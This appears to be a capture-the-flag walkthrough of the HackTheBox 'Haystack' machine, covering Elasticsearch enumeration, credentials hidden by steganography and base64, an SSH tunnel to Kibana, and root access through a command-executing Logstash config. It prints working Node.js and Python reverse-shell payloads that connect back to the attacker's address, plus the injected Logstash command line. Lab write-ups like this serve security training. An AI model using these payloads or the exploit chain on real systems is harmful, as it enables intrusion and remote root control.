---
title: 'HackTheBox: Haystack'
date: 2019-10-01T10:21:58-04:00
categories: [Walkthrough, HackTheBox]
tags: [Linux, web, elasticsearch, logstash, Kibana, stegonography]
---
## Scans

{% highlight plain_text %}
Starting Nmap 7.80 ( <https://nmap.org> ) at 2019-10-01 09:16 EDT  
Nmap scan report for 10.10.10.115  
Host is up, received user-set (0.24s latency).

PORT STATE SERVICE REASON VERSION  
**22/tcp** open ssh syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)  
| ssh-hostkey:  
| 2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)  
| 256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)  
|_ 256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)  
**80/tcp** open http syn-ack ttl 63 nginx 1.12.2  
|_http-server-header: nginx/1.12.2  
|_http-title: Site doesn&#8217;t have a title (text/html).  
**9200/tcp** open http syn-ack ttl 63 nginx 1.12.2  
| http-methods:  
|_ Potentially risky methods: **DELETE**  
|_http-server-header: nginx/1.12.2  
|_http-title: Site doesn&#8217;t have a title (application/json; charset=UTF-8).  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Aggressive OS guesses: Linux 3.10 &#8211; 4.11 (91%), Linux 3.12 (91%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 &#8211; 4.6  
(91%), Linux 3.2 &#8211; 4.9 (91%), Linux 3.8 &#8211; 3.11 (91%), Linux 4.2 (91%), Linux 4.4 (91%), Linux 3.16 (90%)

NMAP shows an SSH server, and two HTTP servers. The interesting thing is the HTTP server on port 9200 has the DELETE method available.
{% endhighlight %}
&nbsp;

## Website Investigations

The site on regular HTTP port 80 is very bare, only giving us a picture and nothing else:  
<img class="alignnone wp-image-347 size-large" src="/assets/img/2019/10/2019-10-01_09h41_20.png" /> 

&nbsp;

The site on HTTP 9200 has more going on. It is an elasticsearch service version 6.4.2:  
<img class="alignnone size-full wp-image-348" src="/assets/img/2019/10/2019-10-01_09h42_54.png" /> 

So the picture is a clue that we&#8217;ll be looking up something in the search database. Hence the picture of a &#8220;needle&#8221;, which is what a search query is sometimes called.

It&#8217;s possible this version of elasticsearch has an exploit out there. There is one I found but it is about the &#8220;console&#8221; plugin and it doesn&#8217;t appear to work here&#8230; [CVE-2018-17246](https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/).

&nbsp;

## REST API

I didn&#8217;t know anything about elasticsearch before this box, so I&#8217;ll write out things as I learn them and hope it all goes well. The port 9200 is used for elasticsearch&#8217;s REST API, so we&#8217;ll need to learn how to use it from elasticsearch&#8217;s documentation.

When trying to use a typical query POST request, I get an error stating that the server doesn&#8217;t support POST.

{% highlight json %}
root@kali /root                                                       
⚡ curl -XPOST "http://10.10.10.115:9200" -d'
{               
  "query":{
    "match_all":{}
  }
}
'
{"error":"Incorrect HTTP method for uri [/] and method [POST], allowed: [HEAD, DELETE, GET]","status":405}#
{% endhighlight %}

And that&#8217;s because I wasn&#8217;t using it correctly, since I didn&#8217;t know what I was doing.

Here&#8217;s a request that returns something.

{% highlight json %}
root@kali /root                                                                                                            
⚡ curl -XPOST "http://10.10.10.115:9200/_search/"                                                                         
{"took":3,"timed_out":false,"_shards":{"total":11,"successful":11,"skipped":0,"failed":0},"hits":{"total":1254,"max_score":
1.0,"hits":[{"_index":".kibana","_type":"doc","_id":"config:6.4.2","_score":1.0,"_source":{"type":"config","updated_at":"20
19-01-23T18:15:53.396Z","config":{"buildNum":18010,"telemetry:optIn":false}}},{"_index":"bank","_type":"account","_id":"25"
,"_score":1.0,"_source":{"account_number":25,"balance":40540,"firstname":"Virginia","lastname":"Ayala","age":39,"gender":"F
","address":"171 Putnam Avenue","employer":"Filodyne","email":"virginiaayala@filodyne.com","city":"Nicholson","state":"PA"}
},{"_index":"bank","_type":"account","_id":"44","_score":1.0,"_source":{"account_number":44,"balance":34487,"firstname":"Au
relia","lastname":"Harding","age":37,"gender":"M","address":"502 Baycliff Terrace","employer":"Orbalix","email":"aureliahar
ding@orbalix.com","city":"Yardville","state":"DE"}},{"_index":"bank","_type":"account","_id":"99","_score":1.0,"_source":{"
account_number":99,"balance":47159,"firstname":"Ratliff","lastname":"Heath","age":39,"gender":"F","address":"806 Rockwell P
lace","employer":"Zappix","email":"ratliffheath@zappix.com","city":"Shaft","state":"ND"}},{"_index":"bank","_type":"account
","_id":"119","_score":1.0,"_source":{"account_number":119,"balance":49222,"firstname":"Laverne","lastname":"Johnson","age"
:28,"gender":"F","address":"302 Howard Place","employer":"Senmei","email":"lavernejohnson@senmei.com","city":"Herlong","sta
te":"DC"}},{"_index":"bank","_type":"account","_id":"126","_score":1.0,"_source":{"account_number":126,"balance":3607,"firs
tname":"Effie","lastname":"Gates","age":39,"gender":"F","address":"620 National Drive","employer":"Digitalus","email":"effi
egates@digitalus.com","city":"Blodgett","state":"MD"}},{"_index":"bank","_type":"account","_id":"145","_score":1.0,"_source
":{"account_number":145,"balance":47406,"firstname":"Rowena","lastname":"Wilkinson","age":32,"gender":"M","address":"891 El
ton Street","employer":"Asimiline","email":"rowenawilkinson@asimiline.com","city":"Ripley","state":"NH"}},{"_index":"bank",
"_type":"account","_id":"183","_score":1.0,"_source":{"account_number":183,"balance":14223,"firstname":"Hudson","lastname":
"English","age":26,"gender":"F","address":"823 Herkimer Place","employer":"Xinware","email":"hudsonenglish@xinware.com","ci
ty":"Robbins","state":"ND"}},{"_index":"bank","_type":"account","_id":"190","_score":1.0,"_source":{"account_number":190,"b
alance":3150,"firstname":"Blake","lastname":"Davidson","age":30,"gender":"F","address":"636 Diamond Street","employer":"Qua
ntasis","email":"blakedavidson@quantasis.com","city":"Crumpler","state":"KY"}},{"_index":"bank","_type":"account","_id":"20
8","_score":1.0,"_source":{"account_number":208,"balance":40760,"firstname":"Garcia","lastname":"Hess","age":26,"gender":"F
","address":"810 Nostrand Avenue","employer":"Quiltigen","email":"garciahess@quiltigen.com","city":"Brooktrails","state":"G
A"}}]}}
{% endhighlight %}

And here is the formatted JSON:

{% highlight json %}
{
  "took": 3,
  "timed_out": false,
  "_shards": {
    "total": 11,
    "successful": 11,
    "skipped": 0,
    "failed": 0
  },
  "hits": {
    "total": 1254,
    "max_score": 1.0,
    "hits": [
      {
        "_index": ".kibana",
        "_type": "doc",
        "_id": "config:6.4.2",
        "_score": 1.0,
        "_source": {
          "type": "config",
          "updated_at": "2019-01-23T18:15:53.396Z",
          "config": {
            "buildNum": 18010,
            "telemetry:optIn": false
          }
        }
      },
      {
        "_index": "bank",
        "_type": "account",
        "_id": "25",
        "_score": 1.0,
        "_source": {
          "account_number": 25,
          "balance": 40540,
          "firstname": "Virginia",
          "lastname": "Ayala",
          "age": 39,
          "gender": "F",
          "address": "171 Putnam Avenue",
          "employer": "Filodyne",
          "email": "virginiaayala@filodyne.com",
          "city": "Nicholson",
          "state": "PA"
        }
      },
      {
        "_index": "bank",
        "_type": "account",
        "_id": "44",
        "_score": 1.0,
        "_source": {
          "account_number": 44,
          "balance": 34487,
          "firstname": "Aurelia",
          "lastname": "Harding",
          "age": 37,
          "gender": "M",
          "address": "502 Baycliff Terrace",
          "employer": "Orbalix",
          "email": "aureliaharding@orbalix.com",
          "city": "Yardville",
          "state": "DE"
        }
      },
      {
        "_index": "bank",
        "_type": "account",
        "_id": "99",
        "_score": 1.0,
        "_source": {
          "account_number": 99,
          "balance": 47159,
          "firstname": "Ratliff",
          "lastname": "Heath",
          "age": 39,
          "gender": "F",
          "address": "806 Rockwell Place",
          "employer": "Zappix",
          "email": "ratliffheath@zappix.com",
          "city": "Shaft",
          "state": "ND"
        }
      },
      {
        "_index": "bank",
        "_type": "account",
        "_id": "119",
        "_score": 1.0,
        "_source": {
          "account_number": 119,
          "balance": 49222,
          "firstname": "Laverne",
          "lastname": "Johnson",
          "age": 28,
          "gender": "F",
          "address": "302 Howard Place",
          "employer": "Senmei",
          "email": "lavernejohnson@senmei.com",
          "city": "Herlong",
          "state": "DC"
        }
      },
      {
        "_index": "bank",
        "_type": "account",
        "_id": "126",
        "_score": 1.0,
        "_source": {
          "account_number": 126,
          "balance": 3607,
          "firstname": "Effie",
          "lastname": "Gates",
          "age": 39,
          "gender": "F",
          "address": "620 National Drive",
          "employer": "Digitalus",
          "email": "effiegates@digitalus.com",
          "city": "Blodgett",
          "state": "MD"
        }
      },
      {
        "_index": "bank",
        "_type": "account",
        "_id": "145",
        "_score": 1.0,
        "_source": {
          "account_number": 145,
          "balance": 47406,
          "firstname": "Rowena",
          "lastname": "Wilkinson",
          "age": 32,
          "gender": "M",
          "address": "891 Elton Street",
          "employer": "Asimiline",
          "email": "rowenawilkinson@asimiline.com",
          "city": "Ripley",
          "state": "NH"
        }
      },
      {
        "_index": "bank",
        "_type": "account",
        "_id": "183",
        "_score": 1.0,
        "_source": {
          "account_number": 183,
          "balance": 14223,
          "firstname": "Hudson",
          "lastname": "English",
          "age": 26,
          "gender": "F",
          "address": "823 Herkimer Place",
          "employer": "Xinware",
          "email": "hudsonenglish@xinware.com",
          "city": "Robbins",
          "state": "ND"
        }
      },
      {
        "_index": "bank",
        "_type": "account",
        "_id": "190",
        "_score": 1.0,
        "_source": {
          "account_number": 190,
          "balance": 3150,
          "firstname": "Blake",
          "lastname": "Davidson",
          "age": 30,
          "gender": "F",
          "address": "636 Diamond Street",
          "employer": "Quantasis",
          "email": "blakedavidson@quantasis.com",
          "city": "Crumpler",
          "state": "KY"
        }
      },
      {
        "_index": "bank",
        "_type": "account",
        "_id": "208",
        "_score": 1.0,
        "_source": {
          "account_number": 208,
          "balance": 40760,
          "firstname": "Garcia",
          "lastname": "Hess",
          "age": 26,
          "gender": "F",
          "address": "810 Nostrand Avenue",
          "employer": "Quiltigen",
          "email": "garciahess@quiltigen.com",
          "city": "Brooktrails",
          "state": "GA"
        }
      }
    ]
  }
}
{% endhighlight %}

Using `curl -XGET "10.10.10.115:9200/bank/"` will show the format of the &#8220;bank&#8221; index. And we can do the same for &#8220;.kibana&#8221;, which might be a little more interesting. But honestly, I didn&#8217;t see anything in either which was really useful unless you&#8217;re a spammer just collecting email addresses. If we knew what ALL the indexes are, then maybe we could find something better.

Use `curl -XGET "10.10.10.115:9200/_cat/indices?v"` to find out what the indexes are:

{% highlight plain_text %}
root@kali /root/htb/haystack                                                                                               
⚡ curl -XGET "10.10.10.115:9200/_cat/indices?v"
health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb
{% endhighlight %}

And you can get the structure of them all by using `curl -XGET "10.10.10.115:9200/*/"` .

After playing with submitting queries, my favorite way to submit them is on the URI like&#8230; `curl -XGET "10.10.10.115:9200/bank/_search/?pretty=true&q=web*"` &#8230; where the &#8220;q=&#8221; is the search string.

While searching around in the data, I found this bit of encouragement to know I&#8217;m on the right track:

{% highlight plain_text %}
root@kali /root/htb/haystack                                                                                               
⚡ curl -XGET "10.10.10.115:9200/quotes/quote/2/_source?pretty=true"
{
  "quote" : "There's a needle in this haystack, you have to search for it"
}
{% endhighlight %}

After a while of trying different searches like `curl -XGET “10.10.10.115:9200/_search?pretty=true&q=needle”` and getting nowhere fast, I decided to reassess where I was at in the challenge. Normally when I&#8217;m stuck that&#8217;s because I&#8217;m overlooking something that I should have paid closer attention to. Along with the help of a hint from a forum post that said the picture wasn&#8217;t actually useless, I was able to find another clue.

I downloaded the image of the needle from the port 80 website, and ran a &#8220;file&#8221; check on it to see if anything odd stood out.

{% highlight plain_text %}
root@kali /root/Downloads                           
⚡ file needle.jpg                                
needle.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, Exif Standard: [TIFF i
mage data, big-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=paint.net 4.1.1], baseline,
 precision 8, 1200x803, components 3
 {% endhighlight %}

Nothing out of the ordinary there, so then I printed out the data with &#8220;cat&#8221;, hoping there might be a hidden string in the padding at the end of the file. That&#8217;s a pretty common stegonography trick with JPEG files. Sure enough there was! It was a base64 encoded string. So I extracted it and decoded it:

{% highlight plain_text %}
root@kali /root/Downloads                                                                                                  
⚡ cat needle.jpg | tail -c 45 | base64 -d
la aguja en el pajar es "clave"                                                                                           
{% endhighlight %}

Google Translate tells me this is Spanish for:

`the needle in the haystack is "key"`

Great! We can query elasticsearch for that and hopefully get somewhere&#8230;

My first query was for &#8220;key&#8221;, but that only returned a couple bank accounts that weren&#8217;t helpful. So then I searched for &#8220;clave&#8221; and got two hits that looked good:

&#8220;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&#8221; which has a base64 string that decodes to &#8220;pass: spanish.is.key&#8221;.

And &#8220;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &#8221; which has another base64 string that decodes to &#8220;user: security&#8221;.

Bingo! This should be the login to the SSH server.

&nbsp;

## SSH

Getting into the SSH with our found credentials gives access to the user flag

Looking at the process list shows that there are some processes running under the users &#8220;kibana&#8221; and &#8220;elasticsearch&#8221;. There was an exploit found early in the recon phase that affects kibana for our version on this box, it just wasn&#8217;t usable for the first stage.

Earlier when we tried to attack kibana it said we were barking up the wrong tree&#8230;

{% highlight plain_text %}
[security@haystack ~]$ curl "localhost:9200/api/console/api_server?"
{"error":{"root_cause":[{"type":"index_not_found_exception","reason":"no such index","resource.type":"index_expression","resource.id":"api","index_uuid":"_na_","index":"api"}],"type":"index_not_found_exception","reason":"no such index","resource.type":"index_expression","resource.id":"api","index_uuid":"_na_","index":"api"},"status":404}[security@haystack ~]$ 
{% endhighlight %}

&#8230;but if the same query is used against the local interface for kibana, we get a different kind of result:

{% highlight plain_text %}[security@haystack ~]$ curl "localhost:5601/api/console/api_server?"
{"statusCode":400,"error":"Bad Request","message":"\"apis\" is a required param."}[security@haystack ~]$
{% endhighlight %}

&#8230;suggesting we may be able to use the exploit afterall.

At first I tried to run the [exploit code](https://github.com/mpgn/CVE-2018-17246) from within the ssh session, but got no results. Then I looked at the forum for just a page or two and there were several hints that seemed to suggest setting up an SSH tunnel to access the 5601 port remotely. So I read up on some [tutorials](https://hackernoon.com/the-ssh-black-magic-for-data-science-acd6f65e8528) for SSH Tunneling since it is kinda confusing. I got the tunnel built with `ssh -L 5601:localhost:5601 security@10.10.10.115` and proved the connection worked by sending one of the previous commands from my box:

{% highlight plain_text %}
root@kali /root/Downloads                            
⚡ curl -XGET "localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis="
{"statusCode":400,"error":"Bad Request","message":"\"apis\" is a required param."}
{% endhighlight %}

At that point we can even open the Kibana app in the browser.  
[<img class="alignnone wp-image-363 size-large" src="/assets/img/2019/10/2019-10-03_10h34_08.png" />](/assets/img/2019/10/2019-10-03_10h34_08.png)

But what we really want is to run the exploit and get a reverse shell.

<img class="alignnone wp-image-366 size-full" src="/assets/img/2019/10/2019-10-03_10h55_54.png" /> 

The above screenshot shows a tunnel connection where I created the [payload](https://github.com/mpgn/CVE-2018-17246) file &#8220;shellb.js&#8221;, and it shows the exploit command being sent to my tunneled port, and finally it shows the reverse connected shell on the left =).

The kibana payload file:

{% highlight javascript %}
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1337, "10.10.14.142", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
{% endhighlight %}

One caveat about the exploit though, if the reverse shell breaks, you may need to rename the payload file before sending the exploit again.

Set up the PTY for the shell once you are in (makes things a little easier)&#8230;  
<img class="alignnone size-full wp-image-367" src="/assets/img/2019/10/2019-10-03_11h14_55.png" /> 

I like to make the prompt better, but that&#8217;s just me&#8230;  
<img class="alignnone wp-image-368 size-full" src="/assets/img/2019/10/2019-10-03_11h16_35.png" /> 

Also, while playing with the prompt I goofed on a command and saw something interesting&#8230;  
<img class="alignnone size-full wp-image-369" src="/assets/img/2019/10/2019-10-03_11h13_13.png" /> 

Lol, Spanish sure is key!

Anyway, we can search for files we have access to with <span class="lang:zsh decode:true crayon-inline">find / -group kibana</span> .  You&#8217;ll notice that we have access to configuration files to something called &#8220;logstash&#8221; as well. Logstash is another piece of software from elasticsearch, but this one collects and processes input instead of output like kibana.

There were a few files that seemed interesting:

{% highlight plain_text %}
[kibana@haystack conf.d]$  ls
filter.conf  input.conf  output.conf
[kibana@haystack conf.d]$  cat filter.conf
filter {
        if [type] == "execute" {
                grok {
                        match =&gt; { "message" =&gt; "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}
[kibana@haystack conf.d]$  cat input.conf
input {
    file {
        path =&gt; "/opt/kibana/logstash_*"
        start_position =&gt; "beginning"
        sincedb_path =&gt; "/dev/null"
        stat_interval =&gt; "10 second"
        type =&gt; "execute"
        mode =&gt; "read"
    }
}
[kibana@haystack conf.d]$ cat output.conf
output {
    if [type] == "execute" {
        stdout { codec =&gt; json }
        exec {
            command =&gt; "%{comando} &"
        }
    }
}
{% endhighlight %}

It looks like there could be command injection (type == &#8220;execute&#8221;) in the output.conf and filter.conf codes.

I read some basic info pages on the [config](https://www.elastic.co/guide/en/logstash/current/config-examples.html) files and I believe how it works is as follows:  
Our data is defined by the input{} block and given certain attributes such as its type. The data is then processed by the filter{} block. Within the filter block, the grok{} routine uses a special parser called Grok to extract symbolic meaning out of the general text string, in this case &#8220;comando&#8221;. The results of the filter{} processing is piped to the output{} block for sending to the operating system through files, stdout, or in our case, shell execution.

According to the [stat_interval](https://www.elastic.co/guide/en/logstash/current/plugins-inputs-file.html#plugins-inputs-file-stat_interval) setting, the file input should be read every 10 seconds and executed if it grew in size.

> Discovering new files and checking whether they have grown/or shrunk occurs in a loop. This loop will sleep for <code class="literal">stat_interval</code> seconds before looping again. However, if files have grown, the new content is read and lines are enqueued. Reading and enqueuing across all grown files can take time, especially if the pipeline is congested. So the overall loop time is a combination of the <code class="literal">stat_interval</code> and the file read time.

Creating a file &#8220;/opt/kibana/logstash_a&#8221; should fit the input{} block of the config file.

Writing &#8220;Ejecutar comando: echo test&#8221; should fit the grok filter{} block. This can be tested with the Grok Debugger in the Web App we have access to now.

Looking at the process list we can see the logstash process is running as root, so if we it can connect out to a reverse shell, we&#8217;ll get root!

{% highlight plain_text %}
[security@haystack tmp]$ ps -aux |grep logstash
root       6194  1.1 13.3 2738240 515912 ?      SNsl 07:20   3:54 /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash
kibana    17764  0.0  0.1 151424  5000 pts/5    S+   10:31   0:00 vim logstash_1
security  18412  0.0  0.0 112708   976 pts/0    R+   13:04   0:00 grep --color=auto logstash
{% endhighlight %}

There&#8217;s multiple ways to do it, but creating a python script for the reverse shell and calling the script with the Grok command should work. My reverse shell script:

{% highlight python %}
#!/usr/bin/python
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.142",1338))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);
{% endhighlight %}

And the Grok command to send:

{% highlight plain_text %}
Ejecutar comando: /tmp/rshell.py
{% endhighlight %}

And it&#8217;ll take a little while for the logstash routine to run the payload, but it does eventually work!

<img class="alignnone size-full wp-image-375" src="/assets/img/2019/10/2019-10-04_14h30_08.png" /> 

From there, just grab the root flag and this box is done!!

&nbsp;